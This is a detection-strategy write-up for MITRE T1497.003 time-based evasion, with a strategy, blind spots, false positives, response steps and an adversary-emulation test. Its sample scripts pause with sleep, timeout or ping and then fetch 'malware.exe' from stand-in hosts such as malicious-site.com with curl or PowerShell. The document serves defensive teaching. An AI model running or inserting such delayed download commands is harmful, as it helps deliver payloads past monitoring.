# Alerting & Detection Strategy: Time-Based Evasion via Delayed Execution (T1497.003)

## Goal
The aim of this detection technique is to identify adversarial attempts to bypass security monitoring by using time-based evasion tactics. Specifically, it focuses on detecting scenarios where adversaries delay the execution of malicious code or commands to evade detection mechanisms that rely on timing patterns.

## Categorization

- **MITRE ATT&CK Mapping:** T1497.003 - Time Based Evasion
- **Tactic / Kill Chain Phases:** Defense Evasion, Discovery
- **Platforms:** Linux, macOS, Windows
- [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1497/003)

## Strategy Abstract

The detection strategy involves monitoring for the use of time-based delay commands or scripts across different platforms. Data sources such as command-line logs, process monitoring data, and network traffic are analyzed to identify patterns that suggest delayed execution, which is indicative of evasion attempts.

Key patterns include:
- Use of sleep commands (`sleep`, `timeout`) in shell scripts.
- Pinging local or external hosts to create delays.
- Execution loops with time delays within scripts.

## Technical Context

Adversaries may employ time-based evasion by introducing artificial delays between the execution of malicious activities and their actual intended effects. This can help them slip past security measures that monitor for immediate, suspicious behavior. Real-world examples include:
- Using `sleep` or `timeout` commands in bash/shell scripts.
- Pinging localhost or external IPs to delay script execution.

**Sample Commands:**
```bash
# Example on Linux/macOS using sleep
echo "Starting attack sequence..."
sleep 300 # Delay for 5 minutes
curl http://malicious-site.com/malware.exe

# Example on Windows using timeout
@echo off
echo Starting attack sequence...
timeout /t 3600 >nul # Delay for 1 hour
powershell -Command "Invoke-WebRequest http://malicious-site.com/malware.exe"
```

## Blind Spots and Assumptions

- **Assumption:** Detection relies on logs being accurately recorded and available in real-time.
- **Blind Spot:** If adversaries use sophisticated obfuscation techniques or custom delay implementations, these may not be detected by standard pattern matching.
- **Limitation:** Not all legitimate uses of delay commands can be differentiated from malicious intent without context.

## False Positives

Potential benign activities that might trigger false alerts include:
- Legitimate software installations with post-installation scripts using delays for configuration purposes.
- Scheduled tasks or cron jobs with built-in wait times.
- Network diagnostic tools that use ping for latency testing.

## Priority
**Severity: High**

Justification: Time-based evasion can effectively bypass detection systems and allow adversaries to carry out malicious activities without immediate interference, posing significant risks to organizational security.

## Validation (Adversary Emulation)

### Step-by-step instructions:

1. **Setup Environment:** Prepare a controlled test environment with monitoring tools capturing command-line activities and network traffic.
   
2. **Delay Execution with Ping:**
   - On Linux/macOS:
     ```bash
     ping 127.0.0.1 -c 60 # Pings localhost for 60 seconds
     echo "Executing malicious activity..."
     curl http://example.com/malware.exe
     ```
   - On Windows:
     ```batch
     ping 127.0.0.1 -n 360 > nul # Pings localhost for 360 iterations (~3 minutes)
     @echo off
     echo Executing malicious activity...
     powershell -Command "Invoke-WebRequest http://example.com/malware.exe"
     ```

3. **Monitor Logs:** Check logs to ensure the delay and subsequent command execution are captured accurately.

## Response

Upon detection of a time-based evasion attempt:
- Immediately isolate affected systems from the network.
- Conduct a thorough investigation to determine the scope and impact.
- Review recent activities on the system for additional signs of compromise.
- Update security policies and monitoring configurations to enhance future detection capabilities.

## Additional Resources
Additional references and context are not available. Further research into specific evasion techniques and mitigation strategies is recommended to supplement this strategy.